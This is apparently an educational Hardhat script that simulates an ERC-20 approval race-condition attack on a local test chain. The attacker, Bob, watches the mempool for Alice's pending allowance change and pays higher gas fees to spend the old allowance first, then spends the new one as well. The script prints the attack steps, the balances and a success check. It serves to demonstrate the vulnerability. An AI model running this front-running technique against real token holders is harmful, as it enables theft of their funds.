const { ethers } = require("hardhat");

async function main() {
    // Get signers: owner, alice, bob
    const [owner, alice, bob] = await ethers.getSigners();

    console.log("===== Initializing Attack Simulation =====\n");
    console.log(`Owner Address:    ${owner.address}`);
    console.log(`Alice Address:    ${alice.address}`);
    console.log(`Bob Address:      ${bob.address}\n`);

    // Deploy the CTUToken contract
    const CTUToken = await ethers.getContractFactory("CTUToken");
    const ctuToken = await CTUToken.deploy();
    await ctuToken.waitForDeployment();
    console.log(`CTUToken deployed at: ${ctuToken.target}\n`);

    // Define token amounts
    const transferAmount = ethers.parseUnits("300", 18);
    const approvalAmount = ethers.parseUnits("100", 18);
    const increasedApprovalAmount = ethers.parseUnits("200", 18);

    // Expected final balances
    const expectedAliceBalance = ethers.parseUnits("0", 18); // 300 - 100 - 200 = 0
    const expectedBobBalance = ethers.parseUnits("300", 18); // 0 + 100 + 200 = 300

    // Owner transfers 300 tokens to Alice
    const transferTx = await ctuToken.transfer(alice.address, transferAmount);
    await transferTx.wait(); // Wait for the transaction to be mined

    // Alice approves Bob to spend 100 tokens
    const approveTx = await ctuToken.connect(alice).approve(bob.address, approvalAmount);
    approveReceipt1 = await approveTx.wait(); // Wait for the transaction to be mined

    // Display Initial State
    console.log("===== Initial State =====");
    await displayState(ctuToken, alice, bob);
    console.log("========================\n");

    // Step 3: Alice initiates approval to increase to 200 tokens
    console.log("=== Step 1: Alice Initiates Approval to Increase Allowance");
    console.log("=== Alice is sending a transaction to the mempool to approve 200 CTU for Bob.\n");
    const approveTxIncreased = await ctuToken.connect(alice).approve(bob.address, increasedApprovalAmount);

    // Print the state of the mempool
    await printMempool();

    console.log("=== Step 2: Bob detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
    console.log("=== Bob is frontrunning the transaction by setting higher fees.");

    // Increase maxFeePerGas and maxPriorityFeePerGas by 10 gwei
    const gasEstimate = await ethers.provider.getFeeData();
    const increasedMaxFeePerGas = gasEstimate.maxFeePerGas + (ethers.parseUnits('10', 'gwei'));
    const increasedMaxPriorityFeePerGas = gasEstimate.maxPriorityFeePerGas + (ethers.parseUnits('10', 'gwei'));

    // Bob sends transferFrom using the old allowance, he is frontrunning the transaction, he sets the fees higher
    const txBob1 = await ctuToken.connect(bob).transferFrom(alice.address, bob.address, approvalAmount, {
        maxFeePerGas: increasedMaxFeePerGas,
        maxPriorityFeePerGas: increasedMaxPriorityFeePerGas,
    });

    await printMempool();

    // Wait until both transactions are mined
    await approveTxIncreased.wait();
    await txBob1.wait();

    console.log("Bob transferred 100 CTU using the initial allowance.\n");
    console.log("Alice's transaction is mined after being frontrunned by Bob's transferFrom transaction.\n");

    // Display State After Alice's Approval
    console.log("===== State After Alice's Approval =====");
    await displayState(ctuToken, alice, bob);
    console.log("==========================================\n");

    console.log("=== Step 3: Bob Utilizes Increased Approval");
    console.log("=== Bob transfers an additional 200 CTU using the increased allowance.");
    // Transfer the remaining 200 tokens using the increased approval
    const txBob2 = await ctuToken.connect(bob).transferFrom(alice.address, bob.address, increasedApprovalAmount)
    await txBob2.wait();  // Wait until the transaction is mined

    // Display Final State
    console.log("===== Final State =====");
    await displayState(ctuToken, alice, bob);
    console.log("=======================\n");

    // Fetch actual final balances and allowance
    const finalAliceBalance = await ctuToken.balanceOf(alice.address);
    const finalBobBalance = await ctuToken.balanceOf(bob.address);
    const finalAllowance = await ctuToken.allowance(alice.address, bob.address);

    // Check if the attack was successful
    const isAttackSuccessful = finalAliceBalance == expectedAliceBalance &&
        finalBobBalance == expectedBobBalance &&
        finalAllowance == 0;

    if (isAttackSuccessful) {
        console.log("===== Attack Successful =====");
        console.log("The attack has successfully exploited the approval race condition.");
        console.log(`Final Alice Balance: ${ethers.formatUnits(finalAliceBalance, 18)} CTU`);
        console.log(`Final Bob Balance:   ${ethers.formatUnits(finalBobBalance, 18)} CTU`);
        console.log(`Final Allowance:     ${ethers.formatUnits(finalAllowance, 18)} CTU\n`);
    } else {
        console.log("===== Attack Failed =====");
        console.log("The attack did not execute as expected. Details below:");

        // Detailed failure reasons
        if (finalAliceBalance != expectedAliceBalance) {
            console.log(`- Alice's balance is ${ethers.formatUnits(finalAliceBalance, 18)} CTU, expected ${ethers.formatUnits(expectedAliceBalance, 18)} CTU.`);
        }
        if (finalBobBalance != expectedBobBalance) {
            console.log(`- Bob's balance is ${ethers.formatUnits(finalBobBalance, 18)} CTU, expected ${ethers.formatUnits(expectedBobBalance, 18)} CTU.`);
        }
        if (finalAllowance != 0) {
            console.log(`- Allowance is ${ethers.formatUnits(finalAllowance, 18)} CTU, expected 0 CTU.`);
        }

        // Additional Logs for Debugging
        console.log("\n===== Detailed Final State =====");
        await displayState(ctuToken, alice, bob);
        console.log("================================\n");
    }

    console.log("===== Attack Simulation Completed =====");

    // Uncomment to print all the information about the mined blocks
    // await printAllBlocksInfo();
}

// Helper function to display current state
async function displayState(ctuToken, alice, bob) {
    const aliceBalance = ethers.formatUnits(await ctuToken.balanceOf(alice.address), 18);
    const bobBalance = ethers.formatUnits(await ctuToken.balanceOf(bob.address), 18);
    const allowance = ethers.formatUnits(await ctuToken.allowance(alice.address, bob.address), 18);
    console.log(`Alice Balance:               ${aliceBalance} CTU`);
    console.log(`Bob Balance:                 ${bobBalance} CTU`);
    console.log(`Allowance (Alice->Bob):      ${allowance} CTU`);
}

// Helper function to log transaction details
function logTransactionDetails(title, tx, receipt) {
    console.log(`===== ${title} =====`);
    console.log(`Transaction Hash: ${tx.hash}`);
    console.log(`Block Number:     ${receipt.blockNumber}`);
    console.log(`Block Hash:       ${receipt.blockHash}`);
    console.log(`Gas Used:         ${receipt.gasUsed.toString()}`);
    console.log(`Status:           ${receipt.status === 1 ? "Success" : "Failed"}`);
    if (receipt.events && receipt.events.length > 0) {
        console.log("Events Emitted:");
        receipt.events.forEach((event, index) => {
            console.log(`  Event ${index + 1}: ${event.event}`);
            console.log(`    Arguments: ${JSON.stringify(event.args)}`);
        });
    }
    console.log("========================\n");
}

// Helper function to print pending transactions
async function printMempool() {
    const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
        "pending",
        false,
    ]);
    for (const tx of pendingBlock.transactions) {
        const txData = await network.provider.send("eth_getTransactionByHash", [tx]);
        console.log(`Transaction Hash: ${txData.hash}`);
        console.log(`From:             ${txData.from}`);
        console.log(`To:               ${txData.to}`);
        console.log(`Value:            ${ethers.formatUnits(txData.value, "ether")} ETH`);
        console.log(`Gas Price:        ${ethers.formatUnits(txData.gasPrice, "gwei")} GWEI`);
        console.log(`Gas:              ${Number(txData.gas)}`);
        console.log(`Input:            ${txData.input}`);
        console.log(`Max Fee Per Gas:  ${ethers.formatUnits(txData.maxFeePerGas, "gwei")} GWEI`);
        console.log(`Max Priority Fee: ${ethers.formatUnits(txData.maxPriorityFeePerGas, "gwei")} GWEI`);
        // console.log(`Transaction Object: ${JSON.stringify(txData, null, 2)}`);
        console.log("------------------------------------------\n");
    }
}

// Helper function to print the information about the last block
async function printLastBlockInfo() {
    const lastBlock =  await hre.ethers.provider.getBlock("latest");
    console.log("===== Block Mined =====");
    console.log(`Block Number:     ${lastBlock.number}`);
    console.log(`Block Hash:       ${lastBlock.hash}`);
    console.log(`Parent Hash:      ${lastBlock.parentHash}`);
    console.log(`Timestamp:        ${new Date(lastBlock.timestamp * 1000).toLocaleString()}`);
    console.log(`Transactions:     ${lastBlock.transactions.length}`);
    console.log(`Validator:        ${lastBlock.miner || lastBlock.validator}`);  // Use 'miner' or 'validator' depending on the network
    console.log(`Gas Limit:        ${ethers.formatUnits(lastBlock.gasLimit, "gwei")} GWEI`);
    console.log(`Gas Used:         ${ethers.formatUnits(lastBlock.gasUsed, "gwei")} GWEI`);
    console.log(`Base Fee Per Gas: ${ethers.formatUnits(lastBlock.baseFeePerGas, "gwei")} GWEI`);
    console.log("==================================\n");

    // Print transactions, their hashes, and order
    console.log("===== Transactions in Last Block =====");
    const transactions = await Promise.all(lastBlock.transactions.map(txHash => ethers.provider.getTransaction(txHash)));
    transactions.sort((a, b) => a.nonce - b.nonce);
    for (const tx of transactions) {
        console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
    }
    
    console.log("======================================\n");
}

// Helper function to print information about all blocks
async function printAllBlocksInfo() {
    const latestBlockNumber = await hre.ethers.provider.getBlockNumber();  // Get the latest block number
    console.log(`Printing all blocks starting from block 0 to block ${latestBlockNumber}...\n`);

    // Loop through each block and print its details
    for (let blockNumber = 0; blockNumber <= latestBlockNumber; blockNumber++) {
        const block = await hre.ethers.provider.getBlock(blockNumber);
        console.log("===== Block Information =====");
        console.log(`Block Number:     ${block.number}`);
        console.log(`Block Hash:       ${block.hash}`);
        console.log(`Parent Hash:      ${block.parentHash}`);
        console.log(`Timestamp:        ${new Date(block.timestamp * 1000).toLocaleString()}`);
        console.log(`Transactions:     ${block.transactions.length}`);
        console.log(`Validator:        ${block.miner || block.validator}`);  // Use 'miner' or 'validator' depending on the network
        console.log(`Gas Limit:        ${ethers.formatUnits(block.gasLimit, "gwei")} GWEI`);
        console.log(`Gas Used:         ${ethers.formatUnits(block.gasUsed, "gwei")} GWEI`);
        console.log(`Base Fee Per Gas: ${ethers.formatUnits(block.baseFeePerGas || 0, "gwei")} GWEI`);
        console.log("==============================\n");

        // If the block has transactions, print them
        if (block.transactions.length > 0) {
            console.log("===== Transactions in Block =====");
            // Fetch and display transaction details
            const transactions = await Promise.all(block.transactions.map(txHash => hre.ethers.provider.getTransaction(txHash)));
            transactions.sort((a, b) => a.nonce - b.nonce); // Sort by nonce
            for (const tx of transactions) {
                console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
                console.log(`From: ${tx.from}`);
                console.log(`To: ${tx.to}`);
                console.log(`Value: ${ethers.formatUnits(tx.value, "ether")} ETH`);
                console.log(`Gas Price: ${ethers.formatUnits(tx.gasPrice, "gwei")} GWEI`);
                console.log("-------------------------------");
            }
            console.log("================================\n");
        }
    }
    console.log("===== Block Printing Completed =====");
}


main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error("An error occurred during the attack simulation:");
        console.error(error);
        process.exit(1);
    });
